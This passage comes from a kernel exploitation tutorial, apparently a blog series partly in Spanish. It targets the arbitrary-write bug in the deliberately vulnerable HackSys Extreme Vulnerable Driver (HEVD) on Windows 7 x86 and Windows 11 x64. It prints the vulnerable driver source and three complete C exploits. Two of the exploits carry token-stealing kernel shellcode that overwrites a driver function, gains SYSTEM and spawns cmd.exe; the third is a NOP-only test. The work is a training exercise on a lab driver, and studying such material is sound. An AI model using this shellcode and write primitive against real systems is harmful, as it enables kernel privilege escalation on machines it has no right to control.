embargo, nuestra información de usuario se convertirá en un objeto PWRITE_WHAT_WHERE (técnicamente un puntero a una estructura WRITE_WHAT_WHERE).\nVeamos esta estructura (ArbitraryWrite.h).\n62 typedef struct _WRITE_WHAT_WHERE 63 { 64 PULONG_PTR What; 65 PULONG_PTR Where; 66 } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; Vemos dos punteros a números LONG, nada muy loco.\nHabiendo entendido el diseño de la estructura, veamos la función TriggerArbitraryWrite() que toma nuestra información y la convierte a este tipo de estructura.\n63 NTSTATUS 64 TriggerArbitraryWrite( 65 _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere 66 ) 67 { 68 PULONG_PTR What = NULL; 69 PULONG_PTR Where = NULL; 70 NTSTATUS Status = STATUS_SUCCESS; 71 72 PAGED_CODE(); 73 74 __try 75 { 76 // 77 // Verify if the buffer resides in user mode 78 // 79 80 ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(UCHAR)); 81 82 What = UserWriteWhatWhere-\u0026gt;What; 83 Where = UserWriteWhatWhere-\u0026gt;Where; 84 85 DbgPrint(\u0026#34;[+] UserWriteWhatWhere: 0x%p\\n\u0026#34;, UserWriteWhatWhere); 86 DbgPrint(\u0026#34;[+] WRITE_WHAT_WHERE Size: 0x%X\\n\u0026#34;, sizeof(WRITE_WHAT_WHERE)); 87 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;What: 0x%p\\n\u0026#34;, What); 88 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;Where: 0x%p\\n\u0026#34;, Where); 89 90 #ifdef SECURE 91 // 92 // Secure Note: This is secure because the developer is properly validating if address 93 // pointed by \u0026#39;Where\u0026#39; and \u0026#39;What\u0026#39; value resides in User mode by calling ProbeForRead()/ 94 // ProbeForWrite() routine before performing the write operation 95 // 96 97 ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); 98 ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); 99 100 *(Where) = *(What); 101 #else 102 DbgPrint(\u0026#34;[+] Triggering Arbitrary Write\\n\u0026#34;); 103 104 // 105 // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability 106 // because the developer is writing the value pointed by \u0026#39;What\u0026#39; to memory location 107 // pointed by \u0026#39;Where\u0026#39; without properly validating if the values pointed by \u0026#39;Where\u0026#39; 108 // and \u0026#39;What\u0026#39; resides in User mode 109 // 110 111 *(Where) = *(What); 112 #endif 113 } 114 __except (EXCEPTION_EXECUTE_HANDLER) 115 { 116 Status = GetExceptionCode(); 117 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 118 } 119 120 // 121 // There is one more hidden vulnerability. Find it out. 122 // 123 124 return Status; 125 } Como ocurre con todos los bloques de código, veamos esto sección por sección.\n80 ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(UCHAR)); 81 82 What = UserWriteWhatWhere-\u0026gt;What; 83 Where = UserWriteWhatWhere-\u0026gt;Where; 84 85 DbgPrint(\u0026#34;[+] UserWriteWhatWhere: 0x%p\\n\u0026#34;, UserWriteWhatWhere); 86 DbgPrint(\u0026#34;[+] WRITE_WHAT_WHERE Size: 0x%X\\n\u0026#34;, sizeof(WRITE_WHAT_WHERE)); 87 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;What: 0x%p\\n\u0026#34;, What); 88 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;Where: 0x%p\\n\u0026#34;, Where); Vemos que las variables locales de tipo PULONG_PTR se asignan desde nuestra estructura.\nDespués de este código, ingresamos a la declaración #else ya que estamos operando en el controlador vulnerable.\n111 *(Where) = *(What); Aquí vemos que todo lo que se guarde en nuestro puntero What se escribirá en el puntero Where. Para ser más específicos, eliminaremos la referencia al puntero Where y asignaremos el valor almacenado en la ubicación de memoria señalada por What.\nEn teoría podemos escribir lo que queramos donde queramos. Esto significa que no necesitamos preocuparnos demasiado sobre dónde almacenar nuestro código, ya que tenemos acceso a todo el sistema operativo ya que estamos ejecutando bajo el contexto del Kernel.\nNuestro enfoque será filtrar la dirección base de HEVD y determinar una función que podamos sobrescribir para ejecutar nuestro código. Una vez que nuestro código esté colocado en dicha función simplemente podemos llamarlo. Además, no deberíamos tener que preocuparnos por SMEP ya que ejecutaremos una función que debe estar en el espacio del Kernel.\nEsto parece fácil\u0026hellip; aprovechémoslo!\nExplotación # Al ver que esta vulnerabilidad es básica, decidí escribir una PoC inmediatamente. Como podemos escribir en cualquier lugar que queramos, ¡simplemente podemos sobrescribir cualquier función!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define ARW_HELPER_OBJECTS 3 #define MAX_OBJECT_COUNT 65535 #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802) #define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x81B) /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { PULONG_PTR What; PULONG_PTR Where; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* typdef signature for ZwQuerySystemInformation */ typedef NTSTATUS (__stdcall *ZWQUERYSYSTEMINFORMATION)( SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength ); /* Structures used by KernelGetModuleBase */ typedef struct _SYSTEM_MODULE_ENTRY { HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; } SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY; typedef struct _SYSTEM_MODULE_INFORMATION { ULONG Count; SYSTEM_MODULE_ENTRY Module[1]; } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; /* KernelGetModuleBase(): Function used to obtain kernel module address */ PVOID KernelGetModuleBase(PCHAR pcModuleName) { HANDLE hModule = NULL; PVOID pSystemInfo = NULL; PVOID pModule = NULL; ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL; NTSTATUS status = 0xc000009a; // STATUS_INSUFFICIENT_RESOURCES SYSTEM_INFORMATION_CLASS SystemModuleInformation = 0x0B; ULONG SystemInfoSize = 0; hModule = LoadLibraryA(\u0026#34;ntdll.dll\u0026#34;); if (hModule == NULL) { printf(\u0026#34;[-] Failed to load ntdll.dll\\n\u0026#34;); return NULL; } ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hModule, \u0026#34;ZwQuerySystemInformation\u0026#34;); if (ZwQuerySystemInformation == NULL) { printf(\u0026#34;[-] Failed to find ZwQuerySystemInformation within ntdll.dll\u0026#34;); CloseHandle(hModule); return NULL; } /* Obtain the size of the requested information */ status = ZwQuerySystemInformation(SystemModuleInformation, NULL, SystemInfoSize, \u0026amp;SystemInfoSize); if (SystemInfoSize == 0) { printf(\u0026#34;[*] Failed to get size of SystemInformation\\n\u0026#34;); CloseHandle(hModule); return NULL; } pSystemInfo = (PSYSTEM_MODULE_INFORMATION)malloc(SystemInfoSize); if (pSystemInfo == NULL) { printf(\u0026#34;[-] Failed to allocate buffer for SystemInformation\\n\u0026#34;); CloseHandle(hModule); return NULL; } memset(pSystemInfo, \u0026#39;\\0\u0026#39;, SystemInfoSize); /* Obtain the SystemModuleInformation */ status = ZwQuerySystemInformation(SystemModuleInformation, pSystemInfo, SystemInfoSize, \u0026amp;SystemInfoSize); PSYSTEM_MODULE_ENTRY pSysModule = ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))-\u0026gt;Module; for (unsigned long i = 0; i \u0026lt; ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))-\u0026gt;Count; i++) { if (StrStrA(pSysModule[i].FullPathName, pcModuleName) != NULL) { pModule = pSysModule[i].ImageBase; } } if (hModule != NULL) { CloseHandle(hModule); } return pModule; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* WriteBytes(): This function triggers the Write-What-Where vulnerability */ void WriteBytes(HANDLE hHEVD, ULONG ulWhat, ULONG ulWhere) { DWORD dwBytesReturned; WRITE_WHAT_WHERE www = { 0 }; www.Where = (PULONG)ulWhere; www.What = \u0026amp;ulWhat; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, *www.What, www.Where); DeviceIoControl(hHEVD, HEVD_IOCTL_ARBITRARY_WRITE, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return; } /* Exploit(): Arbitrary write */ int Exploit(HANDLE hHEVD) { DWORD i = 0; DWORD dwShellcodeLength = 0; DWORD dwBytesReturned = 0; ULONG target = 0; ULONG ulRawBytes = 0; PVOID pHEVDBase = NULL; CHAR cRawBytes[60] = { 0 }; CHAR cShellcode[]= \u0026#34;\\x90\\x90\\x90\u0026#34; // nops // sickle -p windows/x86/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal /* return code (sickle -a x86 -m asm_shell) */ \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\xc2\\x08\\x00\u0026#34;; // ret 0x8 dwShellcodeLength = 60; if ((dwShellcodeLength % 4) != 0) { printf(\u0026#34;[-] Shellcode must by divisible by 4\\n\u0026#34;); return -1; } pHEVDBase = KernelGetModuleBase(\u0026#34;HEVD\u0026#34;); if (pHEVDBase == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained HEVD base address: 0x%p\\n\u0026#34;, pHEVDBase); target = (ULONG)pHEVDBase + 0x448f2; printf(\u0026#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\\n\u0026#34;); /* This is a quick for loop I whipped up to write our shellcode. The way this works is the buffer is converted into a little endian ASCII address (e.g 0x41424344 -\u0026gt; 0x44434241) then we convert the ASCII address to an unsigned long integer (4 bytes) to be written via the Write-What-Where vulnerability. Each iteration we increment the target address by 4 (32bit address) to point to the next address, we also increment the pointer to the shellcode array by 4 (we can only write 4 bytes at a time). */ for (i = 0; i \u0026lt; dwShellcodeLength; i += 4) { sprintf(cRawBytes, \u0026#34;0x%02x%02x%02x%02x\u0026#34;, ((uint32_t)cShellcode[i+3] \u0026amp; 0xff), ((uint32_t)cShellcode[i+2] \u0026amp; 0xff), ((uint32_t)cShellcode[i+1] \u0026amp; 0xff), ((uint32_t)cShellcode[i+0] \u0026amp; 0xff)); ulRawBytes = strtoul(cRawBytes, NULL, 16); WriteBytes(hHEVD, ulRawBytes, target); memset(cRawBytes, \u0026#39;\\0\u0026#39;, 60); target += 4; } printf(\u0026#34;[+] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx\\n\u0026#34;); DeviceIoControl(hHEVD, HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX, NULL, 0, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy your shell!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); return -1; } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } La victoria se puede ver hacia abajo :)\nUn trabajo buen aprovechando la vulnerabilidad \u0026ldquo;Escribir qué dónde\u0026rdquo;! Como oportunidad de aprender, antes de leer la siguiente sección, intente aprovechar esta vulnerabilidad contra cualquier versión de Windows 11 (x64).\nSi logras ejecutar el código, pregúntese: cuáles son los principales cambios? Hay algunos? Incluso si no lo obtienes antes de continuar, obtendrás habilidades para mejorar aún más tu enfoque durante la explotación. :)\nWindows 11 (x64) # Habiendo completado este desafío bastante rápido en Windows 7 (x86), intentemos explotarlo en Windows 11 (x64).\nIngeniería Inversa # Al observar esta función vulnerable en Ghidra, es fácil detectar la escritura arbitraria usando el código pseudo.\nLo siguiente que debemos hacer es identificar cuáles son los miembros de la estructura _WRITE_WHAT_WHERE, en este caso es fácil de identificar ya que vemos que los miembros a los que se accede se almacenan en punteros \u0026ldquo;unsigned long\u0026rdquo;. Sin embargo, dado que tenemos símbolos, podemos ubicarlos fácilmente solo para estar seguros en el Data Type Manager.\nSabiendo esta información podemos comenzar a crear una PoC para interactuar con esta función.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define ARBITRARY_WRITE 0x22200b /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } void WriteBytes(HANDLE hHEVD, uint64_t ullWhat, uint64_t ullWhere) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = (uint64_t *)ullWhere; www.ullpWhat = \u0026amp;ullWhat; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, *www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return; } int Exploit(HANDLE hHEVD) { LPVOID pHEVDBase = NULL; DWORD i = 0; DWORD dwShellcodeLength = 0; DWORD dwBytesReturned = 0; uint64_t ullTarget = 0; uint64_t ullRawBytes = 0; CHAR cRawBytes[60] = { 0 }; CHAR shellcode[]=\u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x42\u0026#34;; dwShellcodeLength = 8; if ((dwShellcodeLength % 8) != 0) { printf(\u0026#34;[-] Shellcode must be divisible by 8\\n\u0026#34;); return -1; } pHEVDBase = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (pHEVDBase == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of HEVD: 0x%p\\n\u0026#34;, pHEVDBase); ullTarget = (uint64_t)pHEVDBase + 0x85b14; printf(\u0026#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\\n\u0026#34;); for (i = 0; i \u0026lt; dwShellcodeLength; i += sizeof(uint64_t)) { sprintf(cRawBytes, \u0026#34;0x%02x%02x%02x%02x%02x%02x%02x%02x\u0026#34;, ((uint32_t)shellcode[i+7] \u0026amp; 0xff), ((uint32_t)shellcode[i+6] \u0026amp; 0xff), ((uint32_t)shellcode[i+5] \u0026amp; 0xff), ((uint32_t)shellcode[i+4] \u0026amp; 0xff), ((uint32_t)shellcode[i+3] \u0026amp; 0xff), ((uint32_t)shellcode[i+2] \u0026amp; 0xff), ((uint32_t)shellcode[i+1] \u0026amp; 0xff), ((uint32_t)shellcode[i+0] \u0026amp; 0xff)); ullRawBytes = strtoull(cRawBytes, NULL, 16); WriteBytes(hHEVD, ullRawBytes, ullTarget); memset(cRawBytes, \u0026#39;\\0\u0026#39;, 60); ullTarget += sizeof(uint64_t); } } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } Exploit(hHEVD); if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Probemos esto..\nUna vez enviado, podemos ver que hemos activado la escritura arbitraria :)\nExplotación # Después de algunos retoques, pude escribir un exploit completamente funcional que se puede ver a abajo:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define ARBITRARY_WRITE 0x22200b #define TARGET_FUNCTION 0x22206f /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* WriteBytes(): This function triggers the Write-What-Where vulnerability */ void WriteBytes(HANDLE hHEVD, uint64_t ullWhat, uint64_t ullWhere) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = (uint64_t *)ullWhere; www.ullpWhat = \u0026amp;ullWhat; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, *www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): Arbitrary Write */ int Exploit(HANDLE hHEVD) { LPVOID pHEVDBase = NULL; DWORD i = 0; DWORD dwShellcodeLength = 0; DWORD dwBytesReturned = 0; uint64_t ullTarget = 0; uint64_t ullRawBytes = 0; CHAR cRawBytes[60] = { 0 }; CHAR shellcode[]= /* ALIGNMENT */ \u0026#34;\\x90\\x90\u0026#34; /* python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint (58 bytes) */ \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx /* KERNEL RECOVERY */ \u0026#34;\\x48\\x31\\xc0\u0026#34; /* xor rax, rax */ \u0026#34;\\xc3\u0026#34;; /* ret */ dwShellcodeLength = 64; if ((dwShellcodeLength % 8) != 0) { printf(\u0026#34;[-] Shellcode must be divisible by 8\\n\u0026#34;); return -1; } pHEVDBase = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (pHEVDBase == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of HEVD: 0x%p\\n\u0026#34;, pHEVDBase); ullTarget = (uint64_t)pHEVDBase + 0x85b14; printf(\u0026#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\\n\u0026#34;); /* Same operation as the Windows 7 exploit just ported to work on 64bit addressing */ for (i = 0; i \u0026lt; dwShellcodeLength; i += sizeof(uint64_t)) { sprintf(cRawBytes, \u0026#34;0x%02x%02x%02x%02x%02x%02x%02x%02x\u0026#34;, ((uint32_t)shellcode[i+7] \u0026amp; 0xff), ((uint32_t)shellcode[i+6] \u0026amp; 0xff), ((uint32_t)shellcode[i+5] \u0026amp; 0xff), ((uint32_t)shellcode[i+4] \u0026amp; 0xff), ((uint32_t)shellcode[i+3] \u0026amp; 0xff), ((uint32_t)shellcode[i+2] \u0026amp; 0xff), ((uint32_t)shellcode[i+1] \u0026amp; 0xff), ((uint32_t)shellcode[i+0] \u0026amp; 0xff)); ullRawBytes = strtoull(cRawBytes, NULL, 16); WriteBytes(hHEVD, ullRawBytes, ullTarget); memset(cRawBytes, \u0026#39;\\0\u0026#39;, 60); ullTarget += sizeof(uint64_t); } printf(\u0026#34;[*] Shellcode buffer written!!\\n\u0026#34;); printf(\u0026#34;[*] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler\\n\u0026#34;); DeviceIoControl(hHEVD, TARGET_FUNCTION, NULL, 0x00, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy the shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[*] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Una vez, enviada logramos la ejecución del código!\n","date":"5 January 2025","externalUrl":null,"permalink":"/posts/0x04-escribiendo-que-donde-en-el-kernel/","section":"Posts","summary":"","title":"0x04 - Introducción a Windows Kernel \"Write What Where\" Vulnerabilidades","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! First off, if you\u0026rsquo;re following the series from the start, great job getting past the Use After Free in the Windows Kernel! We\u0026rsquo;ll now be exploiting a Write What Where vulnerability on Windows 7 (x86) then proceed to adapt what we learn to Windows 11 (x64).\nArguably this is one of the most powerful types of vulnerabilities - which personally, I prefer to call an Arbitrary Write since that\u0026rsquo;s what my buddies called it before I had ever heard of \u0026ldquo;Write What Where\u0026rdquo;. However, \u0026ldquo;Write What Where\u0026rdquo; may actually be a better term since it has a direct correlation to what the bug does whereas Arbitrary Write is a lot more broad.\nTomato, ToMAto, it does not matter let\u0026rsquo;s get started.\nTable of Contents # What is a Write-What-Where (High Level) Windows 7 (x86) Using the Source ArbitraryWriteIoctlHandler Exploitation Windows 11 (x64) Reverse Engineering Exploitation What is a Write-What-Where (High Level) # Just in case you’re not familiar with what a “Write-What-Where” vulnerability is, let’s start with a quick, high-level overview.\nTo use a non-technical example there\u0026rsquo;s an episode of SpongeBob SquarePants where SpongeBob and Patrick have a snowball fight. Below is an image from said episode:\nNormally, when you make a snow ball you form it into the shape of a sphere. Yet as seen in the image above, Patrick actually makes cubes. In fact Patrick actually makes a lot of different shapes:\nAlthough Patrick does not actually win the snowball fight, he does perform characteristics of a hacker exploiting a Write-What-Where. In the episode, Patrick is launching whatever shapes he wants (Write), created from snow (What), and targeting SpongeBob (Where).\nSimilarly, in the context of a security vulnerability, an attacker can write arbitrary data - this could be anything, like a string, an integer, or a more complex object. Like Patrick, the attacker can also choose where to send this data, targeting specific parts of memory.\nThis ability to control both the data and its destination makes \u0026ldquo;Write-What-Where\u0026rdquo; vulnerabilities highly dangerous, as they can lead to memory corruption, privilege escalation, or even arbitrary code execution.\nWindows 7 (x86) # As with the last couple of tutorials we\u0026rsquo;ll be starting with Windows 7 (x86). Due to the complexity of exploitation we\u0026rsquo;ll be including both exploits within this tutorial!\nThat said rev up that Windows 7 (x86) virtual machine!\nUsing the Source # As with the UaF let\u0026rsquo;s get a lay of the land ( ✧≖ ͜ʖ≖)\n$ find . -name \u0026#34;ArbitraryWrite*\u0026#34; ./Driver/HEVD/ArbitraryWrite.h ./Driver/HEVD/ArbitraryWrite.c Unlike the last couple of vulnerabilities, we\u0026rsquo;re not dealing with a lot of \u0026ldquo;Handler\u0026rdquo; functions, we\u0026rsquo;ll be mainly looking at ArbitraryWriteIoctlHandler.\nArbitraryWriteIoctlHandler() ArbitraryWriteIoctlHandler # Looking at this handler (ArbitraryWrite.c), we can see that our user input will ultimately be passed into TriggerArbitraryWrite().\n134 NTSTATUS 135 ArbitraryWriteIoctlHandler( 136 _In_ PIRP Irp, 137 